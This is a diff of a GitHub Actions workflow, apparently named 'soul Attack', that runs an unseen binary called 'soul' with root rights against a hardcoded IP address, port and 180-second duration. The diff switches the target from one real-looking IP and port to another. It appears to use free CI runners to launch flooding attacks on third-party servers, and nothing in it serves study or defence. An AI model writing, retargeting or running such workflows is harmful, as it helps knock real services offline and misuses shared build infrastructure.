@@ -1,5 +1,6 @@
 name: soul Attack
 on: [push]
+
 jobs:
   attack:
     runs-on: ubuntu-22.04
@@ -10,4 +11,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 20.235.19.173 24257 180 || true
+    - run: sudo ./soul 34.4.27.151 16052 180 || true
